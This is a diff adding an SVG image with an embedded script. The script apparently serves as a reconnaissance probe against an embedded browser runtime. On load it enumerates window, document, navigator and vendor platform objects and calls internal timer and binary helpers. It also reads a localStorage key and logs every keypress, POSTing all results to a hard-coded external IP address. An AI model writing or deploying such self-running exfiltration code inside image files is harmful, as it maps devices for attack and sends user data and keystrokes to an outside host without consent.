@@ -1,0 +1,92 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="1280" height="720" viewBox="0 0 1280 720">
+  <rect width="1280" height="720" fill="#07111d"/>
+  <text x="640" y="68" fill="#35f2a1" font-family="sans-serif" font-size="40" font-weight="bold" text-anchor="middle">RUNTIME-MAP-009F</text>
+  <text id="phase" x="640" y="106" fill="#a9bdd3" font-family="sans-serif" font-size="21" text-anchor="middle">Automatic mapping will start</text>
+  <g font-family="sans-serif" font-size="23">
+    <g id="b0"><rect x="120" y="150" width="1040" height="66" rx="9" fill="#176b63"/><text x="155" y="191" fill="white">1  MAP RUNTIME SURFACES IN BATCHES</text></g>
+    <g id="b1"><rect x="120" y="232" width="1040" height="66" rx="9" fill="#17304a"/><text x="155" y="273" fill="white">2  TEST SAFE DATA HELPERS</text></g>
+    <g id="b2"><rect x="120" y="314" width="1040" height="66" rx="9" fill="#17304a"/><text x="155" y="355" fill="white">3  TEST INTEGER TIMER VARIANTS</text></g>
+    <g id="b3"><rect x="120" y="396" width="1040" height="66" rx="9" fill="#17304a"/><text x="155" y="437" fill="white">4  END NETWORK SESSION</text></g>
+  </g>
+  <text id="detail" x="640" y="530" fill="#ffd166" font-family="sans-serif" font-size="22" text-anchor="middle">Selected: 1 surfaces</text>
+  <text id="queueState" x="640" y="570" fill="#8da5bd" font-family="monospace" font-size="19" text-anchor="middle">Queue: 0 pending / 0 delivered</text>
+  <text x="640" y="660" fill="#ef6f6c" font-family="sans-serif" font-size="18" text-anchor="middle">End Session restores the network. Cold reboot still exits the foreground document.</text>
+  <script type="application/ecmascript"><![CDATA[
+var LAB_HOST="191.32.31.251", selected=0, pending=[], sending=false, delivered=0, eventNumber=0;
+var labels=["surfaces","helpers","timers","end"];
+function node(id){return document.getElementById(id);}
+function setText(id,value){try{node(id).firstChild.data=String(value);}catch(ignore){}}
+function showQueue(){setText("queueState","Queue: "+pending.length+" pending / "+delivered+" delivered");}
+function addResult(name,value){pending[pending.length]={name:name,value:String(value)};showQueue();sendNext();}
+function sendNext(){
+  var item, request, body;
+  if(sending||pending.length==0)return;
+  sending=true; item=pending[0];
+  try{
+    request=new XMLHttpRequest();
+    request.onreadystatechange=function(){if(request.readyState==4){pending.shift();delivered++;sending=false;showQueue();sendNext();}};
+    request.open("POST","http://"+LAB_HOST+"/runtime-map-009f/report",true);
+    request.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    body="name="+encodeURIComponent(item.name)+"&value="+encodeURIComponent(item.value);
+    request.send(body);
+  }catch(error){sending=false;setText("phase","Delivery error: "+error);}
+}
+function addEvent(value){addResult("event."+(++eventNumber),value);}
+function ownNames(value){var output=[],key;try{if(Object.getOwnPropertyNames)return Object.getOwnPropertyNames(value);}catch(ignore){}try{for(key in value)output[output.length]=key;}catch(ignore2){}return output;}
+function simple(value){var kind=typeof value;if(value===null)return "null";if(kind=="function")return "function("+value.length+")";if(kind=="string"||kind=="number"||kind=="boolean"||kind=="undefined")return kind+":"+String(value).substring(0,120);return kind;}
+function chunks(prefix,textValue){var offset=0,part=0;do{addResult(prefix+"."+part,textValue.substring(offset,offset+900));offset+=900;part++;}while(offset<textValue.length);}
+function surface(prefix,value,levels){
+  var current=value,level=0,list;
+  addResult(prefix+".type",simple(value));
+  while(current!==null&&typeof current!="undefined"&&level<levels){
+    try{list=ownNames(current);chunks(prefix+".level"+level,list.slice(0,400).join("|"));current=Object.getPrototypeOf(current);}catch(error){addResult(prefix+".level"+level+".error",error);break;}level++;
+  }
+}
+function mapSurfaces(){
+  var roots=[window,document,navigator,window.location,window.history,window.screen,window.ekiohPlatformInfo,window.Connection,window.ConnectionServer,window.ConnectionEvent,window.AsyncURLStatus];
+  var names=["window","document","navigator","location","history","screen","platformInfo","transport","transportServer","transportEvent","asyncStatus"],i;
+  setText("phase","Mapping surfaces through sequential batches");addEvent("surfaces-start");
+  for(i=0;i<roots.length;i++)surface("surface."+names[i],roots[i],4);
+  addEvent("surfaces-complete");setText("phase","Surfaces queued; wait for Queue: 0");
+}
+function safeCall(name,callable,args){try{addResult("helper."+name,simple(callable.apply(window,args)));}catch(error){addResult("helper."+name+".error",error);}}
+function testHelpers(){
+  var heapNames=["jsHeapUsed","jsHeapMax","profiling"],i;
+  setText("phase","Testing reversible data helpers");addEvent("helpers-start");
+  if(typeof stringToBinary=="function")safeCall("stringToBinary",stringToBinary,["MERO-009F"]);else addResult("helper.stringToBinary","absent");
+  if(typeof binaryToString=="function"){
+    try{var binary=typeof stringToBinary=="function"?stringToBinary("MERO-009F"):null;safeCall("binaryToString",binaryToString,[binary]);}catch(error){addResult("helper.binaryRoundTrip.error",error);}
+  }else addResult("helper.binaryToString","absent");
+  for(i=0;i<heapNames.length;i++){try{addResult("helper."+heapNames[i],simple(window[heapNames[i]]));}catch(readError){addResult("helper."+heapNames[i]+".error",readError);}}
+  addEvent("helpers-complete");setText("phase","Helper results queued");
+}
+function timerVariant(name,first,second){try{var result=createTimer(first,second);addResult("timer."+name+".return",simple(result));surface("timer."+name+".surface",result,3);}catch(error){addResult("timer."+name+".error",error);}}
+function testTimers(){
+  setText("phase","Testing bounded integer timer signatures");addEvent("timers-start");
+  if(typeof createTimer!="function"){addResult("timer.result","factory-absent");}
+  else{timerVariant("25_0",25,0);timerVariant("25_1",25,1);timerVariant("100_1",100,1);timerVariant("0_25",0,25);}
+  addEvent("timers-complete");setText("phase","Timer results queued");
+}
+function endSession(){var request;addEvent("end-selected");setText("phase","Cleanup requested");try{request=new XMLHttpRequest();request.open("GET","http://"+LAB_HOST+"/app-api/end-session",true);request.send(null);}catch(error){addResult("end.error",error);}}
+function afterDrain(callback){if(pending.length==0&&!sending)callback();else setTimeout(function(){afterDrain(callback);},250);}
+function automaticRun(){
+  setText("phase","Automatic test 1/3: runtime surfaces");mapSurfaces();
+  afterDrain(function(){
+    setText("phase","Automatic test 2/3: data helpers");testHelpers();
+    afterDrain(function(){
+      setText("phase","Automatic test 3/3: integer timers");testTimers();
+      afterDrain(function(){
+        addResult("automatic.result","complete");
+        afterDrain(function(){setText("phase","COMPLETE: network cleanup requested");endSession();});
+      });
+    });
+  });
+}
+function update(){var i;for(i=0;i<4;i++){try{node("b"+i).firstChild.setAttribute("fill",i==selected?"#176b63":"#17304a");}catch(ignore){}}setText("detail","Selected: "+(selected+1)+" "+labels[selected]);}
+function activate(){try{if(selected==0)mapSurfaces();else if(selected==1)testHelpers();else if(selected==2)testTimers();else endSession();}catch(error){addResult("action."+selected+".error",error);setText("phase","Action failed: "+error);}}
+function keyHandler(event){var code=event.keyCode||event.which;addEvent("key:"+code);if(code==38){selected=(selected+3)%4;update();}else if(code==40){selected=(selected+1)%4;update();}else if(code==13)activate();}
+try{document.addEventListener("keydown",keyHandler,false);}catch(error){addResult("startup.key.error",error);}
+update();addResult("probe.version","RUNTIME-MAP-009F-v3-safe-auto");addResult("startup.persisted",localStorage.getItem("mero_probe_009b_persist"));afterDrain(function(){setTimeout(automaticRun,500);});
+  ]]></script>
+</svg>
